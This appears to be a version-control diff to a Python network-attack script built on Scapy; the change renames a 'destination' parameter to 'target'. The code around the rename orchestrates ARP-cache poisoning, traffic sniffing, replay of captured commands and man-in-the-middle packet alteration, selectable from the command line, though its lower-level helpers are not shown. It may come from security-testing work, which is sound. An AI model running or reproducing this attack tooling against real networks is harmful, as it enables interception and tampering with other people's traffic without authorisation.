@@ -204,10 +204,10 @@ class ScapyAttacker:
         return ScapyAttacker.sniff_commands
 
     @staticmethod
-    def scan_network(destination, timeout):
+    def scan_network(target, timeout):
         ScapyAttacker.clear_sniffed()
 
-        nodes = ScapyAttacker.discovery(destination)
+        nodes = ScapyAttacker.discovery(target)
         ScapyAttacker.poison_arp_tables(nodes)
         ScapyAttacker.start_sniff(ScapyAttacker.sniff_callback, "", timeout)
         ScapyAttacker.restore_arp_tables(nodes)
@@ -226,25 +226,25 @@ class ScapyAttacker:
                                         NetworkNode(target_ip, target_mac))
 
     @staticmethod
-    def inject_network(destination, timeout):
-        nodes = ScapyAttacker.discovery(destination)
+    def inject_network(target, timeout):
+        nodes = ScapyAttacker.discovery(target)
         ScapyAttacker.poison_arp_tables(nodes)
         ScapyAttacker.start_sniff(ScapyAttacker.inject_callback, "", timeout)
         ScapyAttacker.restore_arp_tables(nodes)
 
     @staticmethod
-    def scan_attack(destination, log):
-        nodes = ScapyAttacker.discovery(destination)
-        log.info('# Found {} in the network {}:'.format(len(nodes), destination))
+    def scan_attack(target, log):
+        nodes = ScapyAttacker.discovery(target)
+        log.info('# Found {} in the network {}:'.format(len(nodes), target))
         for node in nodes:
             log.info(str(node))
 
     @staticmethod
-    def replay_attack(destination, sniff_time, replay_cnt, log):
-        if "/" in destination:
-            ScapyAttacker.scan_network(destination, sniff_time)
+    def replay_attack(target, sniff_time, replay_cnt, log):
+        if "/" in target:
+            ScapyAttacker.scan_network(target, sniff_time)
         else:
-            ScapyAttacker.scan_link(destination.split(",")[0], destination.split(",")[1], sniff_time)
+            ScapyAttacker.scan_link(target.split(",")[0], target.split(",")[1], sniff_time)
 
         for i in range(replay_cnt):
             print("Replaying {}".format(i))
@@ -255,21 +255,21 @@ class ScapyAttacker:
                     time.sleep(delay)
                 command.send_fake()
 
-        log.info('# Sniffed {} packets in the network {}:'.format(len(ScapyAttacker.sniff_commands), destination))
+        log.info('# Sniffed {} packets in the network {}:'.format(len(ScapyAttacker.sniff_commands), target))
         for cmd in ScapyAttacker.sniff_commands:
             log.info(str(cmd))
 
         print('# Replayed sniffed commands for {} times'.format(replay_cnt))
 
     @staticmethod
-    def mitm_attack(destination, sniff_time, error, log):
+    def mitm_attack(target, sniff_time, error, log):
         ScapyAttacker.error = error
-        if "/" in destination:
-            ScapyAttacker.inject_network(destination, sniff_time)
+        if "/" in target:
+            ScapyAttacker.inject_network(target, sniff_time)
         else:
-            ScapyAttacker.inject_link(destination.split(",")[0], destination.split(",")[1], sniff_time)
+            ScapyAttacker.inject_link(target.split(",")[0], target.split(",")[1], sniff_time)
 
-        log.info('# Changed {} packets in the network {}:'.format(len(ScapyAttacker.sniff_commands), destination))
+        log.info('# Changed {} packets in the network {}:'.format(len(ScapyAttacker.sniff_commands), target))
         for cmd in ScapyAttacker.sniff_commands:
             log.info(str(cmd))
 
@@ -285,8 +285,8 @@ if __name__ == '__main__':
                         help='attack timeout for attacks, MitM/Replay attacks: attack seconds, scan: packets',
                         required=False)
 
-    parser.add_argument('--destination', metavar='determine attack destination',
-                        help='determine attack destination', required=False)
+    parser.add_argument('--target', metavar='determine attack target',
+                        help='determine attack target', required=False)
     parser.add_argument('--parameter', metavar='determine attack parameter', type=float, default=5,
                         help='determine attack parameter', required=False)
 
@@ -300,12 +300,12 @@ if __name__ == '__main__':
     logger.addHandler(handler)
 
     if args.attack == 'scan':
-        ScapyAttacker.scan_attack(args.destination, logger)
+        ScapyAttacker.scan_attack(args.target, logger)
 
     if args.attack == 'replay':
-        ScapyAttacker.replay_attack(args.destination, args.timeout, int(args.parameter), logger)
+        ScapyAttacker.replay_attack(args.target, args.timeout, int(args.parameter), logger)
 
     if args.attack == 'mitm':
-        ScapyAttacker.mitm_attack(args.destination, args.timeout,  args.parameter, logger)
+        ScapyAttacker.mitm_attack(args.target, args.timeout,  args.parameter, logger)
 
 
